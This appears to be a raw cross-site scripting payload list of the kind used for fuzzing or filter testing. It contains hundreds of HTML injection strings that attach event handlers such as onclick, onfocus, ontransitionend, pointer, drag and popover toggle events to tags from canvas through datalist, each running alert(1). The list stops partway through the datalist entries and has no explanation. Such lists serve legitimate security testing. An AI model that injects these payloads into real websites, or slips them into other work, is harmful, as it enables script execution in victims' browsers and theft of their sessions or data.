<button popovertarget=x>Click me</button><video2 onbeforetoggle=alert(1) popover id=x>XSS</video2>
<button popovertarget=x>Click me</button><video2 ontoggle=alert(1) popover id=x>XSS</video2>
<button popovertarget=x>Click me</button><wbr onbeforetoggle=alert(1) popover id=x>XSS</wbr>
<button popovertarget=x>Click me</button><wbr ontoggle=alert(1) popover id=x>XSS</wbr>
<button popovertarget=x>Click me</button><xmp onbeforetoggle=alert(1) popover id=x>XSS</xmp>
<button popovertarget=x>Click me</button><xmp ontoggle=alert(1) popover id=x>XSS</xmp>
<canvas contenteditable onbeforeinput=alert(1)>test
<canvas draggable="true" ondrag="alert(1)" style=display:block>test</canvas>
<canvas draggable="true" ondragend="alert(1)" style=display:block>test</canvas>
<canvas draggable="true" ondragenter="alert(1)" style=display:block>test</canvas>
<canvas draggable="true" ondragleave="alert(1)" style=display:block>test</canvas>
<canvas draggable="true" ondragstart="alert(1)" style=display:block>test</canvas>
<canvas id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></canvas>
<canvas id=x tabindex=1 onfocus=alert(1)></canvas>
<canvas id=x tabindex=1 onfocusin=alert(1)></canvas>
<canvas onafterscriptexecute=alert(1)><script>1</script>
<canvas onbeforecopy="alert(1)" contenteditable>test</canvas>
<canvas onbeforecut="alert(1)" contenteditable>test</canvas>
<canvas onbeforescriptexecute=alert(1)><script>1</script>
<canvas onblur=alert(1) id=x tabindex=1 style=display:block>test</canvas><input value=clickme>
<canvas onclick="alert(1)" style=display:block>test</canvas>
<canvas oncontextmenu="alert(1)" style=display:block>test</canvas>
<canvas oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<canvas oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<canvas ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</canvas>
<canvas onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</canvas><input value=clickme>
<canvas onkeydown="alert(1)" contenteditable style=display:block>test</canvas>
<canvas onkeypress="alert(1)" contenteditable style=display:block>test</canvas>
<canvas onkeyup="alert(1)" contenteditable style=display:block>test</canvas>
<canvas onmousedown="alert(1)" style=display:block>test</canvas>
<canvas onmouseenter="alert(1)" style=display:block>test</canvas>
<canvas onmouseleave="alert(1)" style=display:block>test</canvas>
<canvas onmousemove="alert(1)" style=display:block>test</canvas>
<canvas onmouseout="alert(1)" style=display:block>test</canvas>
<canvas onmouseover="alert(1)" style=display:block>test</canvas>
<canvas onmouseup="alert(1)" style=display:block>test</canvas>
<canvas onmousewheel=alert(1) style=display:block>requires scrolling
<canvas onpaste="alert(1)" contenteditable>test</canvas>
<canvas onpointerdown=alert(1) style=display:block>XSS</canvas>
<canvas onpointerenter=alert(1) style=display:block>XSS</canvas>
<canvas onpointerleave=alert(1) style=display:block>XSS</canvas>
<canvas onpointermove=alert(1) style=display:block>XSS</canvas>
<canvas onpointerout=alert(1) style=display:block>XSS</canvas>
<canvas onpointerover=alert(1) style=display:block>XSS</canvas>
<canvas onpointerrawupdate=alert(1) style=display:block>XSS</canvas>
<canvas onpointerup=alert(1) style=display:block>XSS</canvas>
<canvas onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></canvas>
<caption contenteditable onbeforeinput=alert(1)>test
<caption draggable="true" ondrag="alert(1)" style=display:block>test</caption>
<caption draggable="true" ondragend="alert(1)" style=display:block>test</caption>
<caption draggable="true" ondragenter="alert(1)" style=display:block>test</caption>
<caption draggable="true" ondragleave="alert(1)" style=display:block>test</caption>
<caption draggable="true" ondragstart="alert(1)" style=display:block>test</caption>
<caption id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></caption>
<caption id=x tabindex=1 onfocus=alert(1)></caption>
<caption id=x tabindex=1 onfocusin=alert(1)></caption>
<caption onafterscriptexecute=alert(1)><script>1</script>
<caption onbeforecopy="alert(1)" contenteditable>test</caption>
<caption onbeforecut="alert(1)" contenteditable>test</caption>
<caption onbeforescriptexecute=alert(1)><script>1</script>
<caption onblur=alert(1) id=x tabindex=1 style=display:block>test</caption><input value=clickme>
<caption onclick="alert(1)" style=display:block>test</caption>
<caption oncontextmenu="alert(1)" style=display:block>test</caption>
<caption oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<caption oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<caption ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</caption>
<caption onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</caption><input value=clickme>
<caption onkeydown="alert(1)" contenteditable style=display:block>test</caption>
<caption onkeypress="alert(1)" contenteditable style=display:block>test</caption>
<caption onkeyup="alert(1)" contenteditable style=display:block>test</caption>
<caption onmousedown="alert(1)" style=display:block>test</caption>
<caption onmouseenter="alert(1)" style=display:block>test</caption>
<caption onmouseleave="alert(1)" style=display:block>test</caption>
<caption onmousemove="alert(1)" style=display:block>test</caption>
<caption onmouseout="alert(1)" style=display:block>test</caption>
<caption onmouseover="alert(1)" style=display:block>test</caption>
<caption onmouseup="alert(1)" style=display:block>test</caption>
<caption onmousewheel=alert(1) style=display:block>requires scrolling
<caption onpaste="alert(1)" contenteditable>test</caption>
<caption onpointerdown=alert(1) style=display:block>XSS</caption>
<caption onpointerenter=alert(1) style=display:block>XSS</caption>
<caption onpointerleave=alert(1) style=display:block>XSS</caption>
<caption onpointermove=alert(1) style=display:block>XSS</caption>
<caption onpointerout=alert(1) style=display:block>XSS</caption>
<caption onpointerover=alert(1) style=display:block>XSS</caption>
<caption onpointerrawupdate=alert(1) style=display:block>XSS</caption>
<caption onpointerup=alert(1) style=display:block>XSS</caption>
<caption onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></caption>
<center contenteditable onbeforeinput=alert(1)>test
<center draggable="true" ondrag="alert(1)" style=display:block>test</center>
<center draggable="true" ondragend="alert(1)" style=display:block>test</center>
<center draggable="true" ondragenter="alert(1)" style=display:block>test</center>
<center draggable="true" ondragleave="alert(1)" style=display:block>test</center>
<center draggable="true" ondragstart="alert(1)" style=display:block>test</center>
<center id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></center>
<center id=x tabindex=1 onfocus=alert(1)></center>
<center id=x tabindex=1 onfocusin=alert(1)></center>
<center onafterscriptexecute=alert(1)><script>1</script>
<center onbeforecopy="alert(1)" contenteditable>test</center>
<center onbeforecut="alert(1)" contenteditable>test</center>
<center onbeforescriptexecute=alert(1)><script>1</script>
<center onblur=alert(1) id=x tabindex=1 style=display:block>test</center><input value=clickme>
<center onclick="alert(1)" style=display:block>test</center>
<center oncontextmenu="alert(1)" style=display:block>test</center>
<center oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<center oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<center ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</center>
<center onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</center><input value=clickme>
<center onkeydown="alert(1)" contenteditable style=display:block>test</center>
<center onkeypress="alert(1)" contenteditable style=display:block>test</center>
<center onkeyup="alert(1)" contenteditable style=display:block>test</center>
<center onmousedown="alert(1)" style=display:block>test</center>
<center onmouseenter="alert(1)" style=display:block>test</center>
<center onmouseleave="alert(1)" style=display:block>test</center>
<center onmousemove="alert(1)" style=display:block>test</center>
<center onmouseout="alert(1)" style=display:block>test</center>
<center onmouseover="alert(1)" style=display:block>test</center>
<center onmouseup="alert(1)" style=display:block>test</center>
<center onmousewheel=alert(1) style=display:block>requires scrolling
<center onpaste="alert(1)" contenteditable>test</center>
<center onpointerdown=alert(1) style=display:block>XSS</center>
<center onpointerenter=alert(1) style=display:block>XSS</center>
<center onpointerleave=alert(1) style=display:block>XSS</center>
<center onpointermove=alert(1) style=display:block>XSS</center>
<center onpointerout=alert(1) style=display:block>XSS</center>
<center onpointerover=alert(1) style=display:block>XSS</center>
<center onpointerrawupdate=alert(1) style=display:block>XSS</center>
<center onpointerup=alert(1) style=display:block>XSS</center>
<center onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></center>
<cite contenteditable onbeforeinput=alert(1)>test
<cite draggable="true" ondrag="alert(1)" style=display:block>test</cite>
<cite draggable="true" ondragend="alert(1)" style=display:block>test</cite>
<cite draggable="true" ondragenter="alert(1)" style=display:block>test</cite>
<cite draggable="true" ondragleave="alert(1)" style=display:block>test</cite>
<cite draggable="true" ondragstart="alert(1)" style=display:block>test</cite>
<cite id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></cite>
<cite id=x tabindex=1 onfocus=alert(1)></cite>
<cite id=x tabindex=1 onfocusin=alert(1)></cite>
<cite onafterscriptexecute=alert(1)><script>1</script>
<cite onbeforecopy="alert(1)" contenteditable>test</cite>
<cite onbeforecut="alert(1)" contenteditable>test</cite>
<cite onbeforescriptexecute=alert(1)><script>1</script>
<cite onblur=alert(1) id=x tabindex=1 style=display:block>test</cite><input value=clickme>
<cite onclick="alert(1)" style=display:block>test</cite>
<cite oncontextmenu="alert(1)" style=display:block>test</cite>
<cite oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<cite oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<cite ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</cite>
<cite onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</cite><input value=clickme>
<cite onkeydown="alert(1)" contenteditable style=display:block>test</cite>
<cite onkeypress="alert(1)" contenteditable style=display:block>test</cite>
<cite onkeyup="alert(1)" contenteditable style=display:block>test</cite>
<cite onmousedown="alert(1)" style=display:block>test</cite>
<cite onmouseenter="alert(1)" style=display:block>test</cite>
<cite onmouseleave="alert(1)" style=display:block>test</cite>
<cite onmousemove="alert(1)" style=display:block>test</cite>
<cite onmouseout="alert(1)" style=display:block>test</cite>
<cite onmouseover="alert(1)" style=display:block>test</cite>
<cite onmouseup="alert(1)" style=display:block>test</cite>
<cite onmousewheel=alert(1) style=display:block>requires scrolling
<cite onpaste="alert(1)" contenteditable>test</cite>
<cite onpointerdown=alert(1) style=display:block>XSS</cite>
<cite onpointerenter=alert(1) style=display:block>XSS</cite>
<cite onpointerleave=alert(1) style=display:block>XSS</cite>
<cite onpointermove=alert(1) style=display:block>XSS</cite>
<cite onpointerout=alert(1) style=display:block>XSS</cite>
<cite onpointerover=alert(1) style=display:block>XSS</cite>
<cite onpointerrawupdate=alert(1) style=display:block>XSS</cite>
<cite onpointerup=alert(1) style=display:block>XSS</cite>
<cite onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></cite>
<code contenteditable onbeforeinput=alert(1)>test
<code draggable="true" ondrag="alert(1)" style=display:block>test</code>
<code draggable="true" ondragend="alert(1)" style=display:block>test</code>
<code draggable="true" ondragenter="alert(1)" style=display:block>test</code>
<code draggable="true" ondragleave="alert(1)" style=display:block>test</code>
<code draggable="true" ondragstart="alert(1)" style=display:block>test</code>
<code id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></code>
<code id=x tabindex=1 onfocus=alert(1)></code>
<code id=x tabindex=1 onfocusin=alert(1)></code>
<code onafterscriptexecute=alert(1)><script>1</script>
<code onbeforecopy="alert(1)" contenteditable>test</code>
<code onbeforecut="alert(1)" contenteditable>test</code>
<code onbeforescriptexecute=alert(1)><script>1</script>
<code onblur=alert(1) id=x tabindex=1 style=display:block>test</code><input value=clickme>
<code onclick="alert(1)" style=display:block>test</code>
<code oncontextmenu="alert(1)" style=display:block>test</code>
<code oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<code oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<code ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</code>
<code onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</code><input value=clickme>
<code onkeydown="alert(1)" contenteditable style=display:block>test</code>
<code onkeypress="alert(1)" contenteditable style=display:block>test</code>
<code onkeyup="alert(1)" contenteditable style=display:block>test</code>
<code onmousedown="alert(1)" style=display:block>test</code>
<code onmouseenter="alert(1)" style=display:block>test</code>
<code onmouseleave="alert(1)" style=display:block>test</code>
<code onmousemove="alert(1)" style=display:block>test</code>
<code onmouseout="alert(1)" style=display:block>test</code>
<code onmouseover="alert(1)" style=display:block>test</code>
<code onmouseup="alert(1)" style=display:block>test</code>
<code onmousewheel=alert(1) style=display:block>requires scrolling
<code onpaste="alert(1)" contenteditable>test</code>
<code onpointerdown=alert(1) style=display:block>XSS</code>
<code onpointerenter=alert(1) style=display:block>XSS</code>
<code onpointerleave=alert(1) style=display:block>XSS</code>
<code onpointermove=alert(1) style=display:block>XSS</code>
<code onpointerout=alert(1) style=display:block>XSS</code>
<code onpointerover=alert(1) style=display:block>XSS</code>
<code onpointerrawupdate=alert(1) style=display:block>XSS</code>
<code onpointerup=alert(1) style=display:block>XSS</code>
<code onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></code>
<col contenteditable onbeforeinput=alert(1)>test
<col draggable="true" ondrag="alert(1)" style=display:block>test</col>
<col draggable="true" ondragend="alert(1)" style=display:block>test</col>
<col draggable="true" ondragenter="alert(1)" style=display:block>test</col>
<col draggable="true" ondragleave="alert(1)" style=display:block>test</col>
<col draggable="true" ondragstart="alert(1)" style=display:block>test</col>
<col id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></col>
<col id=x tabindex=1 onfocus=alert(1)></col>
<col id=x tabindex=1 onfocusin=alert(1)></col>
<col onafterscriptexecute=alert(1)><script>1</script>
<col onbeforecopy="alert(1)" contenteditable>test</col>
<col onbeforecut="alert(1)" contenteditable>test</col>
<col onbeforescriptexecute=alert(1)><script>1</script>
<col onblur=alert(1) id=x tabindex=1 style=display:block>test</col><input value=clickme>
<col onclick="alert(1)" style=display:block>test</col>
<col oncontextmenu="alert(1)" style=display:block>test</col>
<col oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<col oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<col ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</col>
<col onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</col><input value=clickme>
<col onkeydown="alert(1)" contenteditable style=display:block>test</col>
<col onkeypress="alert(1)" contenteditable style=display:block>test</col>
<col onkeyup="alert(1)" contenteditable style=display:block>test</col>
<col onmousedown="alert(1)" style=display:block>test</col>
<col onmouseenter="alert(1)" style=display:block>test</col>
<col onmouseleave="alert(1)" style=display:block>test</col>
<col onmousemove="alert(1)" style=display:block>test</col>
<col onmouseout="alert(1)" style=display:block>test</col>
<col onmouseover="alert(1)" style=display:block>test</col>
<col onmouseup="alert(1)" style=display:block>test</col>
<col onmousewheel=alert(1) style=display:block>requires scrolling
<col onpaste="alert(1)" contenteditable>test</col>
<col onpointerdown=alert(1) style=display:block>XSS</col>
<col onpointerenter=alert(1) style=display:block>XSS</col>
<col onpointerleave=alert(1) style=display:block>XSS</col>
<col onpointermove=alert(1) style=display:block>XSS</col>
<col onpointerout=alert(1) style=display:block>XSS</col>
<col onpointerover=alert(1) style=display:block>XSS</col>
<col onpointerrawupdate=alert(1) style=display:block>XSS</col>
<col onpointerup=alert(1) style=display:block>XSS</col>
<col onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></col>
<colgroup contenteditable onbeforeinput=alert(1)>test
<colgroup draggable="true" ondrag="alert(1)" style=display:block>test</colgroup>
<colgroup draggable="true" ondragend="alert(1)" style=display:block>test</colgroup>
<colgroup draggable="true" ondragenter="alert(1)" style=display:block>test</colgroup>
<colgroup draggable="true" ondragleave="alert(1)" style=display:block>test</colgroup>
<colgroup draggable="true" ondragstart="alert(1)" style=display:block>test</colgroup>
<colgroup id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></colgroup>
<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>
<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>
<colgroup onafterscriptexecute=alert(1)><script>1</script>
<colgroup onbeforecopy="alert(1)" contenteditable>test</colgroup>
<colgroup onbeforecut="alert(1)" contenteditable>test</colgroup>
<colgroup onbeforescriptexecute=alert(1)><script>1</script>
<colgroup onblur=alert(1) id=x tabindex=1 style=display:block>test</colgroup><input value=clickme>
<colgroup onclick="alert(1)" style=display:block>test</colgroup>
<colgroup oncontextmenu="alert(1)" style=display:block>test</colgroup>
<colgroup oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<colgroup oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<colgroup ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</colgroup>
<colgroup onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</colgroup><input value=clickme>
<colgroup onkeydown="alert(1)" contenteditable style=display:block>test</colgroup>
<colgroup onkeypress="alert(1)" contenteditable style=display:block>test</colgroup>
<colgroup onkeyup="alert(1)" contenteditable style=display:block>test</colgroup>
<colgroup onmousedown="alert(1)" style=display:block>test</colgroup>
<colgroup onmouseenter="alert(1)" style=display:block>test</colgroup>
<colgroup onmouseleave="alert(1)" style=display:block>test</colgroup>
<colgroup onmousemove="alert(1)" style=display:block>test</colgroup>
<colgroup onmouseout="alert(1)" style=display:block>test</colgroup>
<colgroup onmouseover="alert(1)" style=display:block>test</colgroup>
<colgroup onmouseup="alert(1)" style=display:block>test</colgroup>
<colgroup onmousewheel=alert(1) style=display:block>requires scrolling
<colgroup onpaste="alert(1)" contenteditable>test</colgroup>
<colgroup onpointerdown=alert(1) style=display:block>XSS</colgroup>
<colgroup onpointerenter=alert(1) style=display:block>XSS</colgroup>
<colgroup onpointerleave=alert(1) style=display:block>XSS</colgroup>
<colgroup onpointermove=alert(1) style=display:block>XSS</colgroup>
<colgroup onpointerout=alert(1) style=display:block>XSS</colgroup>
<colgroup onpointerover=alert(1) style=display:block>XSS</colgroup>
<colgroup onpointerrawupdate=alert(1) style=display:block>XSS</colgroup>
<colgroup onpointerup=alert(1) style=display:block>XSS</colgroup>
<colgroup onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></colgroup>
<command contenteditable onbeforeinput=alert(1)>test
<command draggable="true" ondrag="alert(1)" style=display:block>test</command>
<command draggable="true" ondragend="alert(1)" style=display:block>test</command>
<command draggable="true" ondragenter="alert(1)" style=display:block>test</command>
<command draggable="true" ondragleave="alert(1)" style=display:block>test</command>
<command draggable="true" ondragstart="alert(1)" style=display:block>test</command>
<command id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></command>
<command id=x tabindex=1 onfocus=alert(1)></command>
<command id=x tabindex=1 onfocusin=alert(1)></command>
<command onafterscriptexecute=alert(1)><script>1</script>
<command onbeforecopy="alert(1)" contenteditable>test</command>
<command onbeforecut="alert(1)" contenteditable>test</command>
<command onbeforescriptexecute=alert(1)><script>1</script>
<command onblur=alert(1) id=x tabindex=1 style=display:block>test</command><input value=clickme>
<command onclick="alert(1)" style=display:block>test</command>
<command oncontextmenu="alert(1)" style=display:block>test</command>
<command oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<command oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<command ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</command>
<command onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</command><input value=clickme>
<command onkeydown="alert(1)" contenteditable style=display:block>test</command>
<command onkeypress="alert(1)" contenteditable style=display:block>test</command>
<command onkeyup="alert(1)" contenteditable style=display:block>test</command>
<command onmousedown="alert(1)" style=display:block>test</command>
<command onmouseenter="alert(1)" style=display:block>test</command>
<command onmouseleave="alert(1)" style=display:block>test</command>
<command onmousemove="alert(1)" style=display:block>test</command>
<command onmouseout="alert(1)" style=display:block>test</command>
<command onmouseover="alert(1)" style=display:block>test</command>
<command onmouseup="alert(1)" style=display:block>test</command>
<command onmousewheel=alert(1) style=display:block>requires scrolling
<command onpaste="alert(1)" contenteditable>test</command>
<command onpointerdown=alert(1) style=display:block>XSS</command>
<command onpointerenter=alert(1) style=display:block>XSS</command>
<command onpointerleave=alert(1) style=display:block>XSS</command>
<command onpointermove=alert(1) style=display:block>XSS</command>
<command onpointerout=alert(1) style=display:block>XSS</command>
<command onpointerover=alert(1) style=display:block>XSS</command>
<command onpointerrawupdate=alert(1) style=display:block>XSS</command>
<command onpointerup=alert(1) style=display:block>XSS</command>
<command onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></command>
<content contenteditable onbeforeinput=alert(1)>test
<content draggable="true" ondrag="alert(1)" style=display:block>test</content>
<content draggable="true" ondragend="alert(1)" style=display:block>test</content>
<content draggable="true" ondragenter="alert(1)" style=display:block>test</content>
<content draggable="true" ondragleave="alert(1)" style=display:block>test</content>
<content draggable="true" ondragstart="alert(1)" style=display:block>test</content>
<content id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></content>
<content id=x tabindex=1 onfocus=alert(1)></content>
<content id=x tabindex=1 onfocusin=alert(1)></content>
<content onafterscriptexecute=alert(1)><script>1</script>
<content onbeforecopy="alert(1)" contenteditable>test</content>
<content onbeforecut="alert(1)" contenteditable>test</content>
<content onbeforescriptexecute=alert(1)><script>1</script>
<content onblur=alert(1) id=x tabindex=1 style=display:block>test</content><input value=clickme>
<content onclick="alert(1)" style=display:block>test</content>
<content oncontextmenu="alert(1)" style=display:block>test</content>
<content oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<content oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<content ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</content>
<content onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</content><input value=clickme>
<content onkeydown="alert(1)" contenteditable style=display:block>test</content>
<content onkeypress="alert(1)" contenteditable style=display:block>test</content>
<content onkeyup="alert(1)" contenteditable style=display:block>test</content>
<content onmousedown="alert(1)" style=display:block>test</content>
<content onmouseenter="alert(1)" style=display:block>test</content>
<content onmouseleave="alert(1)" style=display:block>test</content>
<content onmousemove="alert(1)" style=display:block>test</content>
<content onmouseout="alert(1)" style=display:block>test</content>
<content onmouseover="alert(1)" style=display:block>test</content>
<content onmouseup="alert(1)" style=display:block>test</content>
<content onmousewheel=alert(1) style=display:block>requires scrolling
<content onpaste="alert(1)" contenteditable>test</content>
<content onpointerdown=alert(1) style=display:block>XSS</content>
<content onpointerenter=alert(1) style=display:block>XSS</content>
<content onpointerleave=alert(1) style=display:block>XSS</content>
<content onpointermove=alert(1) style=display:block>XSS</content>
<content onpointerout=alert(1) style=display:block>XSS</content>
<content onpointerover=alert(1) style=display:block>XSS</content>
<content onpointerrawupdate=alert(1) style=display:block>XSS</content>
<content onpointerup=alert(1) style=display:block>XSS</content>
<content onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></content>
<custom tags contenteditable onbeforeinput=alert(1)>test
<custom tags draggable="true" ondrag="alert(1)" style=display:block>test</custom tags>
<custom tags draggable="true" ondragend="alert(1)" style=display:block>test</custom tags>
<custom tags draggable="true" ondragenter="alert(1)" style=display:block>test</custom tags>
<custom tags draggable="true" ondragleave="alert(1)" style=display:block>test</custom tags>
<custom tags draggable="true" ondragstart="alert(1)" style=display:block>test</custom tags>
<custom tags id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></custom tags>
<custom tags onafterscriptexecute=alert(1)><script>1</script>
<custom tags onbeforescriptexecute=alert(1)><script>1</script>
<custom tags onblur=alert(1) id=x tabindex=1 style=display:block>test</custom tags><input value=clickme>
<custom tags onclick="alert(1)" style=display:block>test</custom tags>
<custom tags oncontextmenu="alert(1)" style=display:block>test</custom tags>
<custom tags oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<custom tags oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<custom tags ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</custom tags>
<custom tags onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</custom tags><input value=clickme>
<custom tags onkeydown="alert(1)" contenteditable style=display:block>test</custom tags>
<custom tags onkeypress="alert(1)" contenteditable style=display:block>test</custom tags>
<custom tags onkeyup="alert(1)" contenteditable style=display:block>test</custom tags>
<custom tags onmousedown="alert(1)" style=display:block>test</custom tags>
<custom tags onmouseenter="alert(1)" style=display:block>test</custom tags>
<custom tags onmouseleave="alert(1)" style=display:block>test</custom tags>
<custom tags onmousemove="alert(1)" style=display:block>test</custom tags>
<custom tags onmouseout="alert(1)" style=display:block>test</custom tags>
<custom tags onmouseover="alert(1)" style=display:block>test</custom tags>
<custom tags onmouseup="alert(1)" style=display:block>test</custom tags>
<custom tags onmousewheel=alert(1) style=display:block>requires scrolling
<custom tags onpointerdown=alert(1) style=display:block>XSS</custom tags>
<custom tags onpointerenter=alert(1) style=display:block>XSS</custom tags>
<custom tags onpointerleave=alert(1) style=display:block>XSS</custom tags>
<custom tags onpointermove=alert(1) style=display:block>XSS</custom tags>
<custom tags onpointerout=alert(1) style=display:block>XSS</custom tags>
<custom tags onpointerover=alert(1) style=display:block>XSS</custom tags>
<custom tags onpointerrawupdate=alert(1) style=display:block>XSS</custom tags>
<custom tags onpointerup=alert(1) style=display:block>XSS</custom tags>
<custom tags onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></custom tags>
<data contenteditable onbeforeinput=alert(1)>test
<data draggable="true" ondrag="alert(1)" style=display:block>test</data>
<data draggable="true" ondragend="alert(1)" style=display:block>test</data>
<data draggable="true" ondragenter="alert(1)" style=display:block>test</data>
<data draggable="true" ondragleave="alert(1)" style=display:block>test</data>
<data draggable="true" ondragstart="alert(1)" style=display:block>test</data>
<data id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></data>
<data id=x tabindex=1 onfocus=alert(1)></data>
<data id=x tabindex=1 onfocusin=alert(1)></data>
<data onafterscriptexecute=alert(1)><script>1</script>
<data onbeforecopy="alert(1)" contenteditable>test</data>
<data onbeforecut="alert(1)" contenteditable>test</data>
<data onbeforescriptexecute=alert(1)><script>1</script>
<data onblur=alert(1) id=x tabindex=1 style=display:block>test</data><input value=clickme>
<data onclick="alert(1)" style=display:block>test</data>
<data oncontextmenu="alert(1)" style=display:block>test</data>
<data oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<data oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<data ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</data>
<data onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</data><input value=clickme>
<data onkeydown="alert(1)" contenteditable style=display:block>test</data>
<data onkeypress="alert(1)" contenteditable style=display:block>test</data>
<data onkeyup="alert(1)" contenteditable style=display:block>test</data>
<data onmousedown="alert(1)" style=display:block>test</data>
<data onmouseenter="alert(1)" style=display:block>test</data>
<data onmouseleave="alert(1)" style=display:block>test</data>
<data onmousemove="alert(1)" style=display:block>test</data>
<data onmouseout="alert(1)" style=display:block>test</data>
<data onmouseover="alert(1)" style=display:block>test</data>
<data onmouseup="alert(1)" style=display:block>test</data>
<data onmousewheel=alert(1) style=display:block>requires scrolling
<data onpaste="alert(1)" contenteditable>test</data>
<data onpointerdown=alert(1) style=display:block>XSS</data>
<data onpointerenter=alert(1) style=display:block>XSS</data>
<data onpointerleave=alert(1) style=display:block>XSS</data>
<data onpointermove=alert(1) style=display:block>XSS</data>
<data onpointerout=alert(1) style=display:block>XSS</data>
<data onpointerover=alert(1) style=display:block>XSS</data>
<data onpointerrawupdate=alert(1) style=display:block>XSS</data>
<data onpointerup=alert(1) style=display:block>XSS</data>
<data onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></data>
<datalist contenteditable onbeforeinput=alert(1)>test
<datalist draggable="true" ondrag="alert(1)" style=display:block>test</datalist>
<datalist draggable="true" ondragend="alert(1)" style=display:block>test</datalist>
<datalist draggable="true" ondragenter="alert(1)" style=display:block>test</datalist>
